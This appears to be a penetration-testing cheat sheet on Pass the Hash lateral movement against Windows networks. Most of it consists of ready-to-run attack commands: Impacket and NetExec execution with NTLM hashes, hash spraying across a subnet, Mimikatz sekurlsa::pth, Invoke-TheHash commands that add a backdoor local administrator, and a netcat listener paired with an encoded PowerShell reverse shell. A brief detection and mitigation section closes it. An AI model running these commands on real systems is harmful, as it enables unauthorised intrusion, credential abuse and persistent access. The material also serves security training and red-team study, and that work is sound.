# Pass the Hash (PTH)

Authenticate to remote systems using NTLM password hashes without knowing the cleartext password.
This lateral movement technique is effective when you've obtained password hashes but cannot crack them.

## Quick Reference

```bash
# Impacket psexec
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

# NetExec PTH
nxc smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

# NetExec with command execution
nxc smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

## Pass the Hash from Linux

### Impacket - psexec

```bash
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

### Impacket - Other Tools

```bash
# WMI execution
impacket-wmiexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

# AT command execution
impacket-atexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

# SMB execution
impacket-smbexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

### NetExec - Subnet Spray

```bash
# Spray hash across subnet
nxc smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

# Local authentication
nxc smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 --local-auth
```

### NetExec - Command Execution

```bash
nxc smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

### RDP with Pass the Hash

```bash
xfreerdp /v:10.129.201.126 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
```

**Requirements for RDP PTH**:
- Restricted Admin Mode must be enabled on target
- Enable with registry key if needed (see Notes section)

## Pass the Hash from Windows

### Mimikatz - PTH to Create Shell

```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:david /ntlm:c39f2beb3d2ec06a62cb887fb391dee0 /domain:blackwood.com /run:cmd.exe" exit
```

This creates a new cmd.exe window in the context of the specified user.

### Invoke-TheHash - Create User

```powershell
cd C:\tools\Invoke-TheHash\
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target 172.16.1.10 -Domain blackwood.com -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

### Invoke-TheHash - Reverse Shell

Start listener:

```powershell
.\nc.exe -lvnp 8001
```

Execute reverse shell:

```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec -Target DC01 -Domain blackwood.com -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e <base64_encoded_shell>"
```

## Common Workflows

### Hash Spray Across Network

1. Obtain NTLM hash from compromised system
2. Use NetExec to spray hash across subnet
3. Identify systems where hash is valid (look for "Pwn3d!")
4. Execute commands or gain shells on accessible systems

### Lateral Movement with Mimikatz

1. Dump hashes from compromised system
2. Use Mimikatz sekurlsa::pth to create shell with hash
3. Access remote shares or systems
4. Dump additional credentials from new systems

### Remote Administration with Impacket

1. Obtain administrator hash
2. Use impacket-psexec or impacket-wmiexec for shell
3. Execute commands or scripts remotely
4. Pivot to additional systems

## Notes

### How Pass the Hash Works

Pass the Hash exploits NTLM authentication:
- NTLM uses password hash for authentication
- Hash can be used directly without cracking
- Works for SMB, WMI, RDP (with Restricted Admin), and other protocols
- Does not work for Kerberos authentication

### UAC and Local Account Restrictions

**UAC Limits PTH for Local Accounts**:

Registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`:
- **Value 0** (default): Only built-in Administrator (RID-500) can perform remote admin
- **Value 1**: All local administrators can perform remote admin

**Exception**: If `FilterAdministratorToken` is enabled (value 1), even RID-500 is restricted.

**Important**: Domain accounts with local admin rights are NOT affected by these restrictions.

### Enabling Restricted Admin Mode for RDP

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

### Hash Format

NTLM hash format for tools:
- Full format: `LM:NTLM`
- LM hash often empty: `:NTLM`
- Example: `:30B3783CE2ABF1AF70F77D0660CF3453`

### NetExec Output Indicators

- **Pwn3d!**: User is local administrator on target
- **[+]**: Authentication successful
- **[-]**: Authentication failed

### Detection and Mitigation

**Detection**:
- Monitor for NTLM authentication from unusual sources
- Alert on lateral movement patterns
- Track use of administrative shares (ADMIN$, C$)
- Monitor for Mimikatz indicators (privilege::debug, sekurlsa)

**Mitigation**:
- Implement LAPS (Local Administrator Password Solution)
- Disable NTLM authentication where possible
- Require Kerberos authentication
- Enable Protected Users group for sensitive accounts
- Implement Credential Guard
- Use tiered administrative model
- Monitor and restrict administrative share access

### LAPS Recommendation

Local Administrator Password Solution (LAPS):
- Randomizes local administrator passwords
- Rotates passwords on fixed interval
- Stores passwords in Active Directory
- Prevents password reuse across systems
- Essential mitigation for PTH attacks

### Tools Comparison

| Tool              | Protocol | Shell Type | Notes                          |
| ----------------- | -------- | ---------- | ------------------------------ |
| impacket-psexec   | SMB      | Interactive| Uses RemComSvc                 |
| impacket-wmiexec  | WMI      | Semi-interactive | Stealthier than psexec    |
| impacket-smbexec  | SMB      | Interactive| Uses native Windows commands   |
| impacket-atexec   | Task Scheduler | Non-interactive | Single command execution |
| NetExec           | SMB/WMI  | Command execution | Best for spraying       |
| Mimikatz          | Various  | New process | Creates shell in user context |

### Related Techniques

- Pass the Ticket (PTT) for Kerberos environments
- Overpass the Hash (Pass the Key)
- Pass the Certificate
- Token impersonation
